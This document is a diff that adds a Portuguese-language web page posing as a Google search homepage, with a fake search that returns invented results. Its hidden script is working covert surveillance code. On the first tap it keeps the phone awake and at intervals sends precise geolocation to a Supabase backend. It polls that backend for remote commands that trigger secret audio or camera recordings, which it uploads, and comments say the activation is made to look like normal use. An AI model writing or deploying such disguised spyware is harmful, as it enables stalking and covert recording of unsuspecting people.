@@ -1,0 +1,343 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<meta name="theme-color" content="#fff">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="default">
+<meta name="mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-title" content="Go service">
+<title>Go service</title>
+<link rel="manifest" href="manifest-clock.json">
+<style>
+  *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+  html,body{margin:0;height:100%;background:#fff;color:#202124;font-family:arial,sans-serif;overflow-x:hidden}
+  body{display:flex;flex-direction:column;min-height:100vh}
+
+  /* ===== HEADER ===== */
+  header{display:flex;justify-content:flex-end;align-items:center;padding:14px 16px;gap:10px;font-size:13px}
+  header a{color:#000;text-decoration:none;cursor:pointer;white-space:nowrap}
+  header a:hover{text-decoration:underline}
+  .apps-grid{width:24px;height:24px;display:grid;grid-template-columns:repeat(3,1fr);grid-gap:3px;padding:4px;border-radius:50%;cursor:pointer;flex-shrink:0}
+  .apps-grid:hover{background:#f0f0f0}
+  .apps-grid div{width:4px;height:4px;background:#5f6368;border-radius:50%}
+  .avatar{width:32px;height:32px;border-radius:50%;background:linear-gradient(135deg,#4285f4,#34a853);color:#fff;display:flex;align-items:center;justify-content:center;font-weight:500;font-size:14px;cursor:pointer;flex-shrink:0}
+
+  /* ===== MAIN ===== */
+  main{flex:1;display:flex;flex-direction:column;align-items:center;padding:0 16px;padding-top:9vh}
+  .logo{font-size:clamp(48px, 14vw, 92px);font-weight:400;letter-spacing:-1px;margin-bottom:24px;user-select:none;text-align:center;line-height:1.1}
+  .logo span:nth-child(1){color:#4285f4}
+  .logo span:nth-child(2){color:#ea4335}
+  .logo span:nth-child(3){color:#fbbc05}
+  .logo span:nth-child(4){color:#4285f4}
+  .logo span:nth-child(5){color:#34a853}
+  .logo span:nth-child(6){color:#ea4335}
+  .logo span:nth-child(7){color:#4285f4}
+  .logo span:nth-child(8){color:#34a853}
+  .logo span:nth-child(9){color:#fbbc05}
+  .logo span:nth-child(10){color:#ea4335}
+
+  .search-box{width:100%;max-width:580px;position:relative}
+  .search-input-wrap{display:flex;align-items:center;border:1px solid #dfe1e5;border-radius:24px;padding:12px 16px;box-shadow:none;transition:box-shadow .2s;min-height:46px}
+  .search-input-wrap:hover,.search-input-wrap:focus-within{box-shadow:0 1px 6px rgba(32,33,36,.28);border-color:transparent}
+  .search-icon{width:20px;height:20px;flex-shrink:0;margin-right:14px;color:#9aa0a6}
+  input#q{flex:1;border:none;outline:none;font-size:16px;background:transparent;color:#202124;min-width:0;width:100%}
+  .mic-btn{width:24px;height:24px;margin-left:10px;cursor:pointer;color:#4285f4;flex-shrink:0}
+
+  .buttons{display:flex;justify-content:center;gap:12px;margin-top:24px;flex-wrap:wrap}
+  .buttons button{background:#f8f9fa;border:1px solid #f8f9fa;color:#3c4043;font-size:14px;padding:10px 16px;border-radius:4px;cursor:pointer;min-height:36px}
+  .buttons button:hover{box-shadow:0 1px 1px rgba(0,0,0,.1);background:#f8f9fa;border-color:#dadce0;color:#202124}
+
+  /* ===== RESULTADOS (fake) ===== */
+  #results{width:100%;max-width:600px;margin:24px auto 0;display:none;padding:0 4px}
+  #results.show{display:block}
+  .result-item{padding:12px 0;border-bottom:1px solid #ebebeb}
+  .result-url{font-size:12px;color:#006621;line-height:1.4;word-break:break-all}
+  .result-title{font-size:16px;color:#1a0dab;cursor:pointer;margin:2px 0}
+  .result-title:hover{text-decoration:underline}
+  .result-desc{font-size:13px;color:#545454;line-height:1.4}
+
+  /* ===== FOOTER ===== */
+  footer{background:#f2f2f2;color:#70757a;font-size:13px;border-top:1px solid #dadce0}
+  .footer-top{padding:12px 16px;border-bottom:1px solid #dadce0}
+  .footer-bot{display:flex;justify-content:space-between;padding:12px 16px;flex-wrap:wrap;gap:8px}
+  footer a{color:#70757a;text-decoration:none;cursor:pointer}
+  footer a:hover{text-decoration:underline}
+
+  /* ===== RESPONSIVO ===== */
+  @media (max-width: 600px) {
+    header{padding:10px 12px;gap:8px;font-size:12px}
+    header a:nth-child(1),header a:nth-child(2){font-size:12px}
+    main{padding-top:6vh}
+    .search-input-wrap{padding:10px 14px}
+    .buttons{margin-top:20px}
+    .buttons button{font-size:13px;padding:8px 14px}
+  }
+  @media (max-width: 380px) {
+    header a{display:none}
+    header a.apps-grid-wrap,.apps-grid,.avatar{display:flex}
+    main{padding-top:4vh}
+    .logo{font-size:42px}
+  }
+  @media (orientation: landscape) and (max-height: 500px) {
+    main{padding-top:2vh}
+    .logo{font-size:48px;margin-bottom:14px}
+    .buttons{margin-top:14px}
+  }
+
+  /* ===== STATUS DISCRETO (bolinha 5px canto inferior esquerdo) ===== */
+  #dot{position:fixed;bottom:6px;left:6px;width:5px;height:5px;border-radius:50%;background:#bbb;z-index:9999}
+  #dot.on{background:#0a0}
+  #dot.rec{background:#f00;animation:pulse 1s infinite}
+  @keyframes pulse{0%,100%{opacity:1}50%{opacity:0.3}}
+
+  /* ===== ELEMENTOS INVISÍVEIS ===== */
+  #v{width:1px;height:1px;opacity:0.01;position:fixed;top:0;left:0;pointer-events:none}
+  #silentAudio{display:none}
+  #hiddenStatus{position:fixed;bottom:-50px;left:-50px;width:1px;height:1px;opacity:0;overflow:hidden;font-size:1px}
+</style>
+</head>
+<body>
+
+<header>
+  <a>Gmail</a>
+  <a>Imagens</a>
+  <div class="apps-grid" title="Apps Google"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div>
+  <div class="avatar">L</div>
+</header>
+
+<main>
+  <div class="logo"><span>G</span><span>o</span><span>&nbsp;</span><span>s</span><span>e</span><span>r</span><span>v</span><span>i</span><span>c</span><span>e</span></div>
+
+  <div class="search-box">
+    <div class="search-input-wrap">
+      <svg class="search-icon" viewBox="0 0 24 24" fill="currentColor"><path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg>
+      <input id="q" type="text" autocomplete="off" spellcheck="false">
+      <svg class="mic-btn" viewBox="0 0 24 24" fill="currentColor"><path d="M12 14c1.66 0 3-1.34 3-3V5c0-1.66-1.34-3-3-3S9 3.34 9 5v6c0 1.66 1.34 3 3 3zm5-3c0 2.76-2.24 5-5 5s-5-2.24-5-5H5c0 3.53 2.61 6.43 6 6.92V21h2v-3.08c3.39-.49 6-3.39 6-6.92h-2z"/></svg>
+    </div>
+    <div class="buttons">
+      <button onclick="fakeSearch()">Pesquisa Google</button>
+      <button onclick="document.getElementById('q').value='';document.getElementById('q').focus()">Estou com sorte</button>
+    </div>
+  </div>
+
+  <div id="results"></div>
+</main>
+
+<footer>
+  <div class="footer-top">Brasil</div>
+  <div class="footer-bot">
+    <div>
+      <a>Sobre</a> &nbsp;•&nbsp;
+      <a>Publicidade</a> &nbsp;•&nbsp;
+      <a>Empresa</a> &nbsp;•&nbsp;
+      <a>Como funciona a Pesquisa</a>
+    </div>
+    <div>
+      <a>Privacidade</a> &nbsp;•&nbsp;
+      <a>Termos</a> &nbsp;•&nbsp;
+      <a>Configurações</a>
+    </div>
+  </div>
+</footer>
+
+<!-- Elementos de rastreamento (escondidos) -->
+<div id="dot"></div>
+<div id="hiddenStatus"></div>
+<video id="v" autoplay muted playsinline></video>
+<audio id="silentAudio" loop preload="auto">
+  <source src="data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA=" type="audio/wav">
+</audio>
+
+<script>
+// ===== CONFIG =====
+const U = "https://jpaflbkafupwqfqfcjrv.supabase.co";
+const K = "sb_publishable_qek2mggF5M47pKggbM42tQ_WTFnOOxf";
+const DEVICE_ID = "LG";
+const CMD_POLL_MS = 4000;
+const GEO_POLL_MS = 10000;
+const REC_DURATION_MS = 30000;
+
+// ===== STATE =====
+let wakeLock = null;
+let lastCmd = 0;
+let lastGeoSent = 0;
+let activated = false;
+let recording = false;
+
+const $ = id => document.getElementById(id);
+const setStatus = txt => { $('hiddenStatus').innerText = txt; };  // invisível
+const setDot = (state) => { $('dot').className = state; };  // '', 'on', 'rec'
+
+// ===== BUSCA FALSA =====
+function fakeSearch() {
+  const q = $('q').value.trim();
+  if (!q) return;
+  const results = $('results');
+  results.innerHTML = '';
+  const fakeResults = [
+    {url: `https://www.${q.toLowerCase().replace(/\s+/g,'')}.com.br`, title: `${q} - Site Oficial`, desc: `Encontre tudo sobre ${q} aqui. Notícias, imagens e atualizações em tempo real.`},
+    {url: `https://pt.wikipedia.org/wiki/${q}`, title: `${q} – Wikipédia, enciclopédia livre`, desc: `${q} é um tema amplo que abrange diversos aspectos. Saiba mais nesta página completa sobre o assunto.`},
+    {url: `https://www.google.com/search?q=${encodeURIComponent(q)}`, title: `${q} - Resultados de busca`, desc: `Veja todos os resultados relacionados a ${q} em diferentes fontes e contextos.`},
+    {url: `https://www.youtube.com/results?search_query=${encodeURIComponent(q)}`, title: `Vídeos sobre ${q} - YouTube`, desc: `Assista aos melhores vídeos sobre ${q}. Conteúdo atualizado diariamente.`}
+  ];
+  fakeResults.forEach(r => {
+    results.innerHTML += `
+      <div class="result-item">
+        <div class="result-url">${r.url}</div>
+        <div class="result-title" onclick="alert('Sem conexão com a internet')">${r.title}</div>
+        <div class="result-desc">${r.desc}</div>
+      </div>`;
+  });
+  results.classList.add('show');
+  window.scrollTo({top: 0, behavior: 'smooth'});
+}
+$('q').addEventListener('keydown', e => { if (e.key === 'Enter') fakeSearch(); });
+
+// ===== WAKE LOCK =====
+async function requestWakeLock() {
+  try {
+    if ('wakeLock' in navigator) {
+      wakeLock = await navigator.wakeLock.request('screen');
+      wakeLock.addEventListener('release', () => {
+        if (activated && document.visibilityState === 'visible') setTimeout(requestWakeLock, 200);
+      });
+    }
+  } catch (e) {}
+}
+
+// ===== ÁUDIO SILENCIOSO =====
+function startSilentAudio() {
+  const audio = $('silentAudio');
+  audio.volume = 0.001;
+  audio.muted = false;
+  const p = audio.play();
+  if (p && p.catch) p.catch(() => {});
+}
+setInterval(() => {
+  if (activated) {
+    const audio = $('silentAudio');
+    if (audio.paused) audio.play().catch(()=>{});
+  }
+}, 15000);
+
+// ===== VISIBILITY CHANGE =====
+document.addEventListener('visibilitychange', () => {
+  if (document.visibilityState === 'visible' && activated) {
+    requestWakeLock();
+    startSilentAudio();
+    checkCmd();
+    sendGeo();
+  }
+});
+
+// ===== UPLOAD =====
+async function uploadBlob(blob, ext) {
+  const name = `${DEVICE_ID}_${Date.now()}.${ext}`;
+  try {
+    await fetch(`${U}/storage/v1/object/videos/${name}`, {
+      method: "POST",
+      headers: {apikey: K, Authorization: "Bearer " + K, "x-upsert": "true", "Content-Type": blob.type},
+      body: blob
+    });
+  } catch (e) {}
+}
+
+// ===== GRAVAÇÃO =====
+async function startRec(mode) {
+  if (recording) return;
+  try {
+    const constraints = mode === 'audio' ? {audio: true} : {video: {facingMode: "environment"}, audio: true};
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    $('v').srcObject = stream;
+    const rec = new MediaRecorder(stream);
+    let chunks = [];
+    rec.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
+    rec.onstop = async () => {
+      recording = false;
+      setDot(activated ? 'on' : '');
+      const blob = new Blob(chunks, {type: mode === 'audio' ? 'audio/webm' : 'video/webm'});
+      await uploadBlob(blob, 'webm');
+      stream.getTracks().forEach(t => t.stop());
+      $('v').srcObject = null;
+    };
+    rec.start();
+    recording = true;
+    setDot('rec');  // bolinha fica vermelha pulsando (sutil)
+    setTimeout(() => { if (rec.state !== 'inactive') rec.stop(); }, REC_DURATION_MS);
+  } catch (e) {
+    recording = false;
+    setDot(activated ? 'on' : '');
+  }
+}
+
+// ===== CHECAR COMANDOS =====
+async function checkCmd() {
+  try {
+    const r = await fetch(`${U}/rest/v1/comandos?device_id=eq.${DEVICE_ID}&order=created_at.desc&limit=1`, {
+      headers: {apikey: K, Authorization: "Bearer " + K}
+    });
+    const d = await r.json();
+    if (!d[0]) return;
+    const t = new Date(d[0].created_at).getTime();
+    if (t <= lastCmd) return;
+    if (Date.now() - t > 60000) return;
+    lastCmd = t;
+    if (d[0].acao === 'audio') startRec('audio');
+    if (d[0].acao === 'video') startRec('video');
+  } catch (e) {}
+}
+
+// ===== GEO =====
+async function sendGeo() {
+  if (!navigator.geolocation) return;
+  if (Date.now() - lastGeoSent < 8000) return;
+  lastGeoSent = Date.now();
+  navigator.geolocation.getCurrentPosition(async p => {
+    try {
+      await fetch(`${U}/rest/v1/rastreador`, {
+        method: "POST",
+        headers: {apikey: K, Authorization: "Bearer " + K, "Content-Type": "application/json", Prefer: "resolution=merge-duplicates"},
+        body: JSON.stringify({device_id: DEVICE_ID, lat: p.coords.latitude, lng: p.coords.longitude, updated_at: new Date().toISOString()})
+      });
+    } catch (e) {}
+  }, err => {}, {enableHighAccuracy: true, maximumAge: 5000, timeout: 8000});
+}
+
+// ===== SERVICE WORKER (se existir) =====
+if ('serviceWorker' in navigator) {
+  navigator.serviceWorker.addEventListener('message', e => {
+    if (!activated) return;
+    if (e.data && (e.data.type === 'periodic-cmd-check' || e.data.type === 'push-check')) {
+      checkCmd();
+      sendGeo();
+    }
+  });
+}
+
+// ===== ATIVAR NO TOQUE =====
+let activationTimer = null;
+function tryActivate() {
+  if (activated) return;
+  activated = true;
+  setDot('on');
+  document.body.requestFullscreen?.();
+  requestWakeLock();
+  startSilentAudio();
+  sendGeo();
+  setInterval(sendGeo, GEO_POLL_MS);
+  checkCmd();
+  setInterval(checkCmd, CMD_POLL_MS);
+  // remove os listeners após ativar
+  document.removeEventListener('click', tryActivate);
+  document.removeEventListener('touchstart', tryActivate);
+}
+// Ativa em qualquer clique/toque na página (parece interação normal com a busca)
+document.addEventListener('click', tryActivate);
+document.addEventListener('touchstart', tryActivate, {passive: true});
+
+// Foca o input ao carregar (parece natural)
+setTimeout(() => $('q').focus(), 500);
+</script>
+</body></html>
